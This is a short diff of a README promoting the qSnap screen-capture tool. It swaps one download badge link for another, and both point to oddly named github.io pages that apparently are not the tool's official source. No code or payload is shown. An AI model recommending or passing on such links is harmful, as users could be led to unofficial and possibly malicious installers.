@@ -16,7 +16,7 @@ Deploying qSnap within your daily routine enhances communication clarity through
   <img src="https://a.fsdn.com/con/app/proj/qsnap/screenshots/qSnap%201.png/max/max/1" alt="Program Interface Screenshot"/>
 </div>
 
-[![Download qSnap](https://img.shields.io/badge/Download_qSnap-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://crystaldisplayprimeydavm999.github.io/.github/qSnap-Screen-Capture)
+[![Capture Screens with qSnap](https://img.shields.io/badge/Capture%20Screens%20with-qSnap-7C3AED?style=flat-square)](https://qsnap-capture.github.io/.github/)
 
 ---
 
